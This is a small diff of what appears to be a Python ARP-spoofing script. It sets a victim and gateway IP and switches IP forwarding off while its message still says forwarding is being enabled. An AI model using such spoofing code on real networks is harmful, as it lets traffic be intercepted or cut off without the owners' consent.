@@ -7,12 +7,12 @@ import time
 
 interface = 'eth0'
 # Victim in this case is the initiator
-victimIP = '192.168.1.124'
+victimIP = '192.168.1.167'
 # Gateway in this case is the target
-gateIP = '192.168.1.127'
+gateIP = '192.168.1.168'
 
 print "\n [*] Enabling IP forwarding... \n"
-os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 
 # Send an ARP request with the destination
 def get_mac(IP):
